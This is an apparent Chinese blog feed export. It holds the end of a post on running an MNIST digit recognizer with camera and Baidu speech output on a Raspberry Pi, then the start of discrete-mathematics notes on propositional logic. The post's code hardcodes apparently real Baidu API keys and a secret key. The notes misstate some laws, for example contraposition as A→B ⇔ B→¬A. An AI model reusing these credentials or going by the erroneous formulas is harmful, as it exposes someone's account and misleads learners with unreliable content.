src="/img/iot-mnist/deal_img9.jpg"></div><hr><p>识别结果<br>0,0<br>1,1<br>2,2<br>3,2<br>4,4<br>5,5<br>6,6<br>7,1<br>8,8<br>9,9</p><p>有几个错了的说…有可能是因为手写后缩放然后像素不是很平滑？有些毛毛角角的地方</p><h2 id="树莓派相关"><a href="#树莓派相关" class="headerlink" title="树莓派相关"></a>树莓派相关</h2><p>这是我入手树莓派的第一个项目，顺带着树莓派的系统软件相关了<br>因为树莓派这么low的配置，所以就不在树莓派上Train了，Model是Train好的，要做的就是移植，然后做些其他啥的<br>树莓派开发我基本上是在Windows下完成的</p><h3 id="烧录系统"><a href="#烧录系统" class="headerlink" title="烧录系统"></a>烧录系统</h3><p>装过这么多系统了，这个是最简单的8</p><ul><li><p>相关下载<br><a href="http://shumeipai.nxez.com/download" target="_blank" rel="noopener">http://shumeipai.nxez.com/download</a><br>我用到的工具有<br><a href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener">Win32DiskImager v0.9.zip</a><br><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener">PuTTY</a></p></li><li><p>系统<br>Raspbian<br>树莓派官方深度定制的硬件驱动与软件程序，官方推荐系统。如果你第一次使用树莓派，请下载这个。Debian的软件策略偏保守，稳定第一，升级是次要的。<br>下载链接：<a href="http://downloads.raspberrypi.org/raspbian_latest" target="_blank" rel="noopener">http://downloads.raspberrypi.org/raspbian_latest</a><br>默认帐号：Username: pi Password: raspberry</p></li></ul><p>具体烧录过程<a href="http://shumeipai.nxez.com/2013/09/07/raspberry-pi-under-windows-system-installation-to-sd-card.html" target="_blank" rel="noopener">传送门</a></p><h3 id="连接树莓派及配置"><a href="#连接树莓派及配置" class="headerlink" title="连接树莓派及配置"></a>连接树莓派及配置</h3><p>因为我没显示器，也没插电脑上是，但是我有多余的网线，<a href="http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html" target="_blank" rel="noopener">一根网线连接树莓派</a><br>找ip的命令<code>arp -a</code>.<br><a href="http://shumeipai.nxez.com/2013/09/07/using-putty-to-log-in-to-the-raspberry-pie.html" target="_blank" rel="noopener">PuTTY登录树莓派</a><br>然后登录以后，先改源 <a href="http://shumeipai.nxez.com/2013/08/31/raspbian-chinese-software-source.html" target="_blank" rel="noopener">传送门</a><br>改完记得update<br>然后改密码…懒得输那么长 <code>sudo passwd</code></p><h3 id="安装相关软件"><a href="#安装相关软件" class="headerlink" title="安装相关软件"></a>安装相关软件</h3><p>这一段不要看了！！！！！！！！！！！！！这是前面悲伤的安装历程，从下一个标题看</p><p>vim <code>sudo apt-get install vim</code>（<del>用不惯</del>不会用树莓派自带的vi）</p><p>pip3 <code>sudo apt install python3-pip</code></p><p>tensorflow <code>pip3 install tensorflow</code><br>然后就遇到问题了…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ERROR: THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE. If you have updated the package versions, please update the hashes. Otherwise, examine the package contents carefully; someone may have tampered with them.</span><br><span class="line">    tensorflow from https://www.piwheels.org/simple/tensorflow/tensorflow-1.13.1-cp37-none-linux_armv7l.whl#sha256=25f4ff027beec1e568baf8e90a07bad59d354560533d6b37318b9efeb70beeb1:</span><br><span class="line">        Expected sha256 25f4ff027beec1e568baf8e90a07bad59d354560533d6b37318b9efeb70beeb1</span><br><span class="line">             Got        359f68c6873e43b30e6722e062e984e4d6ec95bd32300ba2e73265accfe1d99f</span><br></pre></td></tr></table></figure></p><p>这好像是由于网络问题造成的..重试了几次，依然是这个结果…<br>最后我用<code>wget https://github.com/lhelontra/tensorflow-on-arm/releases/download/v1.14.0/tensorflow-1.14.0-cp35-none-linux_armv7l.whl</code>下下来的<br>各种版本<a href="https://github.com/lhelontra/tensorflow-on-arm/releases" target="_blank" rel="noopener">https://github.com/lhelontra/tensorflow-on-arm/releases</a><br><code>sudo apt-get remove python3.7</code>.<br><code>sudo apt-get install python3.5</code>.<br><code>sudo cp /usr/bin/python3.5 /usr/bin/python3</code>.<br>这时候再<code>python3</code>试一下，应该就是3.5的版本了<br><code>sudo apt-get install python3.5-dev</code><br>这时候<code>pip3</code>不能用了，要重新装<br>直接这样重装吧，后面太麻烦了，需要的话加sudo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove python-pip python3-pip</span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python get-pip.py</span><br><span class="line">python3 get-pip.py</span><br></pre></td></tr></table></figure></p><p><del>然后发现<code>python3.7</code>这样是卸不干净的还需要删几个<br><code>sudo apt-get remove libpython3.7</code><br><code>sudo apt-get remove libpython3.7-stdlib</code><br>重新安装完了pip3，然后又不能使用了…<br><code>from pip._internal import main</code><br><code>ModuleNotFoundError: No module named &#39;pip._internal&#39;</code><br>然后找到那个文件的地址，把<code>from pip._internal import main</code>改成<code>from pip import main</code>就能运行了</del><br>终于搞完了，最后就<code>sudo pip3 install tensor+tab</code></p><p>keras <code>sudo pip3 install keras</code></p><p>这些东西搞了一上午+一中午，我吐了<br>为什么卸一个Python版本这么麻烦<br>为什么下载速度这么慢<br>为什么树莓派的系统自带的是Python3.7<br>为什么都9102年了，TensorFlow还不支持Python3.7？？？？？？？？</p><p>真的吐了，最后<code>import keras</code>还是不成功，numpy的版本有问题<br><code>pip3 uninstal numpy</code>然后<code>pip3 install numpy==1.14.5</code><br>最后总算是整好了…</p><p>然后load_model用不了…我吐了..然后自己再搞把版本又搞乱了…重装了</p><h3 id="重装"><a href="#重装" class="headerlink" title="重装"></a>重装</h3><p>这次重装异常顺利<br>只需要和以前一样重装系统，烧录，开SSH，然后下面顺序全部执行就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libatlas-base-dev</span><br><span class="line">pip3 install tensorflow</span><br><span class="line">sudo apt-get install libhdf5-serial-dev</span><br><span class="line">sudo pip3 install h5py</span><br><span class="line">sudo apt-get install python3-scipy</span><br><span class="line">sudo pip3 install keras</span><br></pre></td></tr></table></figure></p><p>然后<code>import tensorflow</code>会报几个WARNING，反正是WARNING，不管了233，能用就行了QAQ</p><h2 id="语音合成"><a href="#语音合成" class="headerlink" title="语音合成"></a>语音合成</h2><p>百度云语音合成Python文档<a href="https://cloud.baidu.com/doc/SPEECH/s/bjwvy67o6" target="_blank" rel="noopener">传送门</a><br><code>sudo pip3 install baidu-aip</code> 安装</p><p>简单的输出调用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipSpeech</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baiduSpeech</span><span class="params">(num)</span>:</span></span><br><span class="line">    APP_ID = <span class="string">'17149919'</span></span><br><span class="line">    API_KEY = <span class="string">'A39mzugX82CZx0hBTnHXdIUz'</span></span><br><span class="line">    SECRET_KEY = <span class="string">'wUrct0zvVeZ9y3ZaeGhz0YfYdsL6Fl47'</span></span><br><span class="line">    </span><br><span class="line">    client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line">    </span><br><span class="line">    result  = client.synthesis(str(num), <span class="string">'zh'</span>, <span class="number">1</span>, &#123;</span><br><span class="line">        <span class="string">'vol'</span>: <span class="number">12</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 识别正确返回语音二进制 错误则返回dict 参照下面错误码</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(result, dict):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'audio.mp3'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(result)</span><br></pre></td></tr></table></figure></p><h2 id="把文件传给树莓派"><a href="#把文件传给树莓派" class="headerlink" title="把文件传给树莓派"></a>把文件传给树莓派</h2><p><code>sudo fdisk  -l</code> 查看u盘分区名<br><code>sudo mount  /dev/sda1  /mnt</code></p><h2 id="在树莓派上测试"><a href="#在树莓派上测试" class="headerlink" title="在树莓派上测试"></a>在树莓派上测试</h2><p><code>python3 test.py</code>.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"></span><br><span class="line">x_test = []</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    img = Image.open(str(w)+<span class="string">'.png'</span>)</span><br><span class="line">    reImg = img.resize((<span class="number">28</span>, <span class="number">28</span>), Image.ANTIALIAS)</span><br><span class="line">    img_arr = np.array(reImg.convert(<span class="string">'L'</span>))</span><br><span class="line">    threshold = <span class="number">110</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">            img_arr[i][j] = <span class="number">255</span>-img_arr[i][j]</span><br><span class="line">            <span class="keyword">if</span>(img_arr[i][j] &lt; threshold):</span><br><span class="line">                img_arr[i][j] = <span class="number">0</span></span><br><span class="line">                print(<span class="string">'1'</span>, end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img_arr[i][j] = <span class="number">255</span></span><br><span class="line">                print(<span class="string">'0'</span>, end=<span class="string">''</span>)</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    x_test.append(img_arr)</span><br><span class="line"></span><br><span class="line">x_test = np.array(x_test)</span><br><span class="line">x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">model = load_model(<span class="string">'my_model.h5'</span>)</span><br><span class="line">y_test = model.predict(x_test)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">    print(i, np.argmax(y_test[i]), sep=<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">    print(i, y_test[i])</span><br></pre></td></tr></table></figure></p><p>运行ok，接下来的都是在树莓派上完成的了，主要是摄像头的调用，还有语音的播放</p><h2 id="拍摄"><a href="#拍摄" class="headerlink" title="拍摄"></a>拍摄</h2><p>先<code>sudo raspi-config</code>在Interfacing Options里把Camera打开<br><code>raspistill -o new.jpg</code>就可以拍摄保存了</p><p>在命令行查看图片的一个方法…虽然很不清晰<br><code>sudo apt-get install caca-utils</code> 然后 <code>img2txt new.jpg</code></p><h2 id="音频输出"><a href="#音频输出" class="headerlink" title="音频输出"></a>音频输出</h2><p>插了个耳机，全是杂音，吵死了<br>然后我上网找了一下解决办法</p><hr><p>…果然大力出奇迹，用力捅到底…<br>语音播放就用mpv好了<br><code>sudo apt-get install mpv</code> 然后 <code>mpv audio.mp3</code>就能听到了</p><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><p>把上面零零散散的代码整合在一起就好了，可以完成一个很基本的识别<br>但是有个问题，就是对图片的要求比较高，因为我控制树莓派拍照实在是太难了…图像处理那一部分也有些问题</p><p><img src="/img/iot-mnist/test1.jpg" alt><br><img src="/img/iot-mnist/test2.jpg" alt></p><p>就这种清晰度的照片，也识别不出来..<br>后续再调整吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipSpeech</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(w)</span>:</span></span><br><span class="line">    x_test = []</span><br><span class="line">    img = Image.open(str(w)+<span class="string">'.jpg'</span>)</span><br><span class="line">    reImg = img.resize((<span class="number">28</span>, <span class="number">28</span>), Image.ANTIALIAS)</span><br><span class="line">    img_arr = np.array(reImg.convert(<span class="string">'L'</span>))</span><br><span class="line">    threshold = <span class="number">110</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">            img_arr[i][j] = <span class="number">255</span>-img_arr[i][j]</span><br><span class="line">            <span class="keyword">if</span>(img_arr[i][j] &lt; threshold):</span><br><span class="line">                img_arr[i][j] = <span class="number">0</span></span><br><span class="line">                print(<span class="string">'1'</span>, end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img_arr[i][j] = <span class="number">255</span></span><br><span class="line">                print(<span class="string">'0'</span>, end=<span class="string">''</span>)</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    x_test.append(img_arr)</span><br><span class="line">    x_test = np.array(x_test)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = load_model(<span class="string">'my_model.h5'</span>)</span><br><span class="line">    y_test = model.predict(x_test)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">        print(i, np.argmax(y_test[i]), sep=<span class="string">','</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">        print(i, y_test[i])</span><br><span class="line">    result = np.argmax(y_test[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baiduSpeech</span><span class="params">(num, counter)</span>:</span></span><br><span class="line">    APP_ID = <span class="string">'17149919'</span></span><br><span class="line">    API_KEY = <span class="string">'A39mzugX82CZx0hBTnHXdIUz'</span></span><br><span class="line">    SECRET_KEY = <span class="string">'wUrct0zvVeZ9y3ZaeGhz0YfYdsL6Fl47'</span></span><br><span class="line">    </span><br><span class="line">    client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line">    </span><br><span class="line">    result  = client.synthesis(str(num), <span class="string">'zh'</span>, <span class="number">1</span>, &#123;</span><br><span class="line">        <span class="string">'vol'</span>: <span class="number">12</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(result, dict):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'audio'</span>+str(counter)+<span class="string">'.mp3'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(result)</span><br><span class="line">    os.system(<span class="string">'mpv audio'</span> + str(counter) + <span class="string">'.mp3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s=str(input())</span><br><span class="line">    counter = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s!=<span class="string">"s"</span>:</span><br><span class="line">        os.system(<span class="string">'raspistill -o '</span>+str(counter) + <span class="string">'.jpg'</span>)</span><br><span class="line">        res = test(counter)</span><br><span class="line">        baiduSpeech(res, counter)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        s=str(input())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>树莓派实验室（实名感谢该社区233）</li></ul>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machinelearning </tag>
            
            <tag> iot </tag>
            
            <tag> raspberry </tag>
            
            <tag> python </tag>
            
            <tag> mnist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散数学笔记</title>
      <link href="/blog/note-discrete-mathematics/"/>
      <url>/blog/note-discrete-mathematics/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>离散数学好像只学第1,2,5部分</p><h2 id="第1部分-数理逻辑"><a href="#第1部分-数理逻辑" class="headerlink" title="第1部分 数理逻辑"></a>第1部分 数理逻辑</h2><h3 id="第1章-命题逻辑的基本概念"><a href="#第1章-命题逻辑的基本概念" class="headerlink" title="第1章 命题逻辑的基本概念"></a>第1章 命题逻辑的基本概念</h3><h4 id="1-1-命题与连接词"><a href="#1-1-命题与连接词" class="headerlink" title="1.1 命题与连接词"></a>1.1 命题与连接词</h4><p><strong>命题</strong>是判断结果唯一的陈述句<br>判断结果称为命题的<strong>真值</strong>，真值只取两个值：<strong>真</strong>或<strong>假</strong><br>真值为真的命题称作<strong>真命题</strong>，真值为假的命题称作<strong>假命题</strong></p><p>不能被分解成更简单的命题称作<strong>简单命题</strong>或<strong>原子命题</strong><br>由简单命题通过联结词联结而成的命题称作<strong>复合命题</strong></p><p>由真能推出假、又由假能推出真，从而既不为真也不能为假的陈述句称作<strong>悖论</strong>，悖论不是命题</p><blockquote><p>定义1.1 设$p$为命题，复合命题“非$p$”（或$p$的否定）称作$p$的<strong>否定式</strong>，记作$\neg p$，符号$\neg$是<strong>否定联结词</strong>，$\neg p$为真当且仅当$p$为假<br>定义1.2 设$p,q$为两个命题，复合命题“$p$并且$q$”（或$p$与$q$）称为$p$与$q$的<strong>合取式</strong>，记作$p\land q$. $\land$称作<strong>合取联结词</strong>，$p\land q$为真，当且仅当$p$与$q$同时为真<br>定义1.3 设$p,q$为两个命题，符合命题$p$或$q$称作$p$与$q$的<strong>析取式</strong>，记作$p\lor q$. $\lor$称作<strong>析取联结词</strong>. 规定$p\lor q$为假当且仅当$p$与$q$同时为假</p></blockquote><p>相容或 $p\lor q$<br>排斥或 $(\neg p\land q)\lor (p\land \neg q)$</p><blockquote><p>定义1.4 设$p,q$为两个命题，复合命题“如果$p$，则$q$”称为$p$与$q$的<strong>蕴含式</strong>，记作$p\to q$，并称$p$是蕴含式的<strong>前件</strong>，$q$为蕴含式的<strong>后件</strong>. $\to$称作<strong>蕴含联结词</strong>，并规定$p\in q$为假当且仅当$p$为真$q$为假<br>$p\to q$的逻辑关系为$q$是$p$的必要条件</p></blockquote><p>自然语言里，$q$是$p$的必要条件的叙述方式</p><ul><li>只要$p$，就$q$</li><li>因为$p$，所以$q$</li><li>$p$仅当$q$</li><li>只有$q$，才$p$</li><li>除非$q$才$p$</li></ul><blockquote><p>定义1.5 设$p,q$为两个命题，复合命题“$p$仅当$q$”称作$p$与$q$的<strong>等价式</strong>，记作$p \leftrightarrow q$，$\leftrightarrow$称作<strong>等价联结词</strong>. 规定$p\leftrightarrow q$为真，当且仅当$p$与$q$同时为真或同时为假<br>$p\leftrightarrow q$的逻辑关系为$p$与$q$互为充分必要条件</p></blockquote><p>优先顺序为$(),\neg,\land,\lor,\to,\leftrightarrow$</p><h4 id="1-2-命题公式及其赋值"><a href="#1-2-命题公式及其赋值" class="headerlink" title="1.2 命题公式及其赋值"></a>1.2 命题公式及其赋值</h4><p>简单命题是命题逻辑中最基本的研究单位，其真值是确定的，又称作<strong>命题常项</strong>或<strong>命题常元</strong>.<br>取值1（真）或0（假）的变元称作<strong>命题变项</strong>或<strong>命题变元</strong><br>可以用命题变项表示真值可以变化的陈述句，命题变项不是命题.<br>将命题变项用联结词和圆括号按照一定的逻辑关系联结起来的符号串称作<strong>合式公式</strong></p><blockquote><p>定义1.6 (1) 单个命题变项是合式公式，并称为原子命题公式<br>(2) 若$A$是合式公式，则$(\neg A)$是合式公式<br>(3) 若$A,B$是合式公式，则$(A\land B),(A\lor B),(A\to B),(A\leftrightarrow B)$是合式公式<br>(4) 有限次地应用(1)-(3)形成的符号串是合式公式</p></blockquote><p>定义1.6采用的是归纳定义或递归定义的方式<br>其中$A,B$用它们表示任意的合式公式，称作<strong>元语言符号</strong>，而某个具体的公式称作<strong>对象语言符号</strong></p><blockquote><p>定义1.7 (1) 若公式$A$是单个的命题变项，则称$A$为0层公式<br>(2) 称$A$是$n+1(n\geqslant 0)$层公式是指下面情况之一<br>(a) $A=\neq B$, $B$是$n$层公式<br>(b) $A=B\land C$, 其中$B$和$C$分别为$i$和$j$层公式，且$n=\max \{i,j\}$<br>(c) $A=B\lor C$, 其中$B,C$的层级及$n$同(b)<br>(d) $A=B\to C$, 其中$B,C$的层级及$n$同(b)<br>(e) $A=B\leftrightarrow C$, 其中$B,C$的层级及$n$同(b)<br>(3) 若公式$A$的层次为$k$，则称$A$是$k$层公式</p><p>定义1.8 设$p_1,p_2,\cdots, p_n$是出现在公式$A$中的全部命题变项，给$p_1,p_2,\cdots,p_n$各指定一个真值，称为对$A$的一个<strong>赋值</strong>或<strong>解释</strong>.<br>若指定的一组真值使$A$为1，则称这组值为$A$的<strong>成真赋值</strong>；若使$A$为0，则称这组值为$A$的<strong>成假赋值</strong>.</p></blockquote><p>赋值按下标顺序或字母顺序依次赋值</p><blockquote><p>定义1.9 将命题公式$A$在所有赋值下取值情况列成表，称作$A$的<strong>真值表</strong>.</p><p>定义1.10 设$A$为任一命题公式<br>(1) 若$A$在它的各种赋值下取值均为真，则称$A$为<strong>重言式</strong>或<strong>永真式</strong>.<br>(2) 若$A$在它的各种赋值下取值均为假，则称$A$为<strong>矛盾式</strong>或<strong>永假式</strong>.<br>(3) 若$A$不是矛盾式，则称$A$为<strong>可满足式</strong>.<br>重言式一定为可满足式</p></blockquote><p>设公式$A,B$中共含有命题变项$p_1,p_2,\cdots,p_n$，而$A$或$B$不全含这些命题变项，则称$A$中不含的命题变项为$A$的<strong>哑元</strong>，即$A$的取值与哑元无关.</p><h3 id="第2章-命题逻辑等值演算"><a href="#第2章-命题逻辑等值演算" class="headerlink" title="第2章 命题逻辑等值演算"></a>第2章 命题逻辑等值演算</h3><h4 id="2-1-等值式"><a href="#2-1-等值式" class="headerlink" title="2.1 等值式"></a>2.1 等值式</h4><blockquote><p>定义2.1 设$A,B$是两个命题公式，若$A,B$构成的等价式$A\leftrightarrow B$为重言式，则称$A$与$B$是等值的，记作$A\Leftrightarrow B$.</p></blockquote><p>常用的等值式模式</p><ol><li>双重否定律 $A\Leftrightarrow \neg \neg A$.</li><li>幂等式 $A\Leftrightarrow A\lor A, A\Leftrightarrow A\land A$.</li><li>交换律 $A\lor B\Leftrightarrow B\lor A,A\land B\Leftrightarrow B\land A$.</li><li>结合律 $(A\lor B)\lor C\Leftrightarrow A\lor (B\lor C), (A\land B)\land C\Leftrightarrow A\land (B\land C)$.</li><li>分配律 $A\lor (B\land C)\Leftrightarrow (A\lor B)\land (A\lor C), A\land (B\lor C)\Leftrightarrow (A\land B)\lor (A\land C)$.</li><li>德摩根律 $\neg (A\lor B)\Leftrightarrow \neg A\land \neg B,\neg (A\land B)\Leftrightarrow \neg A\lor \neg B$.</li><li>吸收律 $A\lor (A\land B)\Leftrightarrow A, A\land (A\lor B)\Leftrightarrow A$.</li><li>零律 $A\lor 1\Leftrightarrow 1,A\land 0\Leftrightarrow 0$.</li><li>同一律 $A\lor 0\Leftrightarrow A, A\land 1\Leftrightarrow A$.</li><li>排中律 $A\lor \neg A\Leftrightarrow 1$.</li><li>矛盾律 $A\land \neg A\Leftrightarrow 0$.</li><li>蕴涵等值律 $A \to B\Leftrightarrow \neg A\lor B$.</li><li>等价等值律 $A\leftrightarrow B\Leftrightarrow (A\to B)\land (B\to A)$.</li><li>假言易位律 $A\to B\Leftrightarrow B\to \neg A$.</li><li>等价否定等值式 $A\leftrightarrow B\Leftrightarrow \neg A\leftrightarrow \neg B$.</li><li>归谬论 $(A\to B)\land (A\to \neg B)\Leftrightarrow \neg A$.</li></ol><p>代入实例<br>由一直的等值式推演出另外一些等值式的过程称作<strong>等值演算</strong>.</p><blockquote><p><strong>置换规则</strong> 设$\Phi (A)$是含公式$A$的命题公式，$\Phi (B)$是用公式$B$置换$\Phi (A)$中$A$的所有出现后得到的命题公式. 若$B \Leftrightarrow A$，则$\Phi (A)\Leftrightarrow \Phi (B)$.</p></blockquote><h4 id="2-2-析取范式与合取范式"><a href="#2-2-析取范式与合取范式" class="headerlink" title="2.2 析取范式与合取范式"></a>2.2 析取范式与合取范式</h4><blockquote><p>定义2.2 命题变项及其否定统称作<strong>文字</strong>. 仅由有限个文字构成的析取式称作<strong>简单析取式</strong>. 仅由有限个文字构成的合取式称作<strong>简单合取式</strong>.</p><p>定理2.1 (1) 一个简单析取式是重言式当且仅当它同时含某个命题变项及它的否定式<br>(2) 一个简单合取式是矛盾式当且仅当它同时含某个命题变项及它的否定式</p><p>定义2.3 由有限个简单合取式的析取构成的命题公式称作<strong>析取范式</strong>. 由有限个简单析取式的合取构成的命题公式称作<strong>合取范式</strong>. 析取范式与合取范式统称作<strong>范式</strong>.</p><p>定理2.2 (1) 一个析取范式是矛盾式当且仅当它的每个简单合取式都是矛盾式<br>(2) 一个合取范式是重言式当且仅当它的每个简单析取范式都是重言式.</p><p>定理2.3(范式存在定理) 任一命题公式都存在与之等值的析取范式与合取范式</p><p>定义2.4 在含有$n$个命题变项的简单合取式(简单析取式)中，若每个命题变项和它的存在的否定式恰好出现一个且仅出现一次，而且命题变项或它的否定式按照下标从小到大或按照字典顺序排列，称这样的简单合取式(简单析取式)为<strong>极小项</strong>(<strong>极大项</strong>).</p></blockquote><p>每个极小项都有且仅由一个成真赋值，每个极大项只有一个成假赋值.</p><blockquote><p>定理2.4 设$m_i$与$M_i$是命题变项含$p_1,p_2,\cdots,p_n$的极小项和极大项，则$\neg m_i\Leftrightarrow M_i,\neg M_i\Leftrightarrow m_i$.<br>定义2.5 所有简单合取式(简单析取式)都是极小项(极大项)的析取范式(合取范式)称为<strong>主析取范式(主合取范式)</strong>.<br>定理2.5 任何命题公式都存在与之等值的主析取范式和主合取范式，并且是唯一的.</p></blockquote><h4 id="2-3-联结词的完备集"><a href="#2-3-联结词的完备集" class="headerlink" title="2.3 联结词的完备集"></a>2.3 联结词的完备集</h4><p>貌似这部分选修…</p><h3 